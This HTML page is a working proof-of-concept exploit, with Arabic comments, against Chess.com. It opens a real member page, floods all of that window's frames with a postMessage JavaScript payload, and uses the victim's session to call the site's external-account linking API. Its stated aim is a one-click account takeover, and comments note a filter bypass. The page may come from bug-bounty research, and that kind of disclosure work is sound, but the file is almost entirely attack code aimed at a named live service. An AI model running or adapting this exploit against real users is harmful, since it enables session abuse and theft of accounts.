<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Recon Attack</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; }
        button { padding: 15px 30px; font-size: 20px; background-color: #e53e3e; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Chess.com FATO Recon</h1>
    <button onclick="startAttack()">Extract Sensitive Data</button>

    <script>
// الـ Payload القاتل لإثبات الـ ATO
        // بيقوم بمخاطبة الـ API الخاص ب ربط الحسابات الخارجية
        let payload = `
            console.log('--- STARTING ATO ATTACK ---');
            
            fetch('https://api.chess.com/rpc/chesscom.user_profile.v1.ExternalAccountService/GetAuthUrl', {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Connect-Protocol-Version': '1'
                },
                // المتصفح هيبعت الـ ACCESS_TOKEN والـ Cookies تلقائياً لأننا في نفس الـ Origin
                body: JSON.stringify({
                    "externalAccountType": "EXTERNAL_ACCOUNT_TYPE_GOOGLE"
                })
            })
            .then(response => response.json())
            .then(data => {
                // إذا ظهر الـ URL في الـ Console، فهذا يعني أننا نجحنا في بدء عملية ربط الحساب (FATO)
                console.log('✅ SUCCESS! API Response (Auth URL):', data);
                
                // إثبات بصري إضافي
                let displayDiv = document.createElement('div');
                displayDiv.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999999;color:#00ff00;padding:50px;font-family:monospace;font-size:18px;">' +
                                       '<h1>[!] 1-CLICK ATO PROOF</h1>' +
                                       '<p>Successfully communicated with Chess.com API using victim session!</p>' +
                                       '<p>Received Auth URL: ' + JSON.stringify(data) + '</p>' +
                                       '</div>';
                document.body.appendChild(displayDiv);
            })
            .catch(err => {
                console.error('❌ API Fetch Error:', err);
            });

            // تخطي الفلتر
            // get_ext
        `.replace(/\n/g, ' ');

        let spammer;

        function blastFrames(win) {
            try { win.postMessage(payload, "*"); } catch(e) {}
            try {
                for (let i = 0; i < win.length; i++) {
                    blastFrames(win[i]);
                }
            } catch(e) {}
        }

        function startAttack() {
            // استخدمت الصفحة دي لأن غالباً بيكون فيها إعلانات
            let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victimWindow");

            setTimeout(() => {
                // سبام كل 10 ملي ثانية
                spammer = setInterval(() => {
                    if(victimWin) blastFrames(victimWin);
                }, 10);

                // زودنا وقت الضرب لـ 15 ثانية عشان نتغلب على تأخير التحميل
                setTimeout(() => {
                    clearInterval(spammer);
                }, 15000);

            }, 2000);
        }
    </script>
</body>
